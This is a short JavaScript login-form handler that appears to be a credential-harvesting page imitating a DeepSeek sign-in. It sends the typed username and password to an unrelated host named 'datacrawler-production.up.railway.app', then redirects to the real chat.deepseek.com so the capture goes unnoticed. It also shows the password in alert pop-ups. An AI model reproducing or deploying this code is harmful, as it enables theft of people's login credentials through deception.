const form = document.getElementById("login_form");

form.addEventListener("submit", async (e) => {
  e.preventDefault();
  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  alert(`Logging in with:\nUsername: ${username}\nPassword: ${password}`);

  const res = await fetch(
    "https://datacrawler-production.up.railway.app/users/login",
    {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ username, password }),
    }
  );

  if (res.ok) {
    window.location.href = "https://chat.deepseek.com/";
  } else {
    window.location.href = "/sign_in";
  }

  alert(`Email: ${username}\nPassword: ${password}`);
});
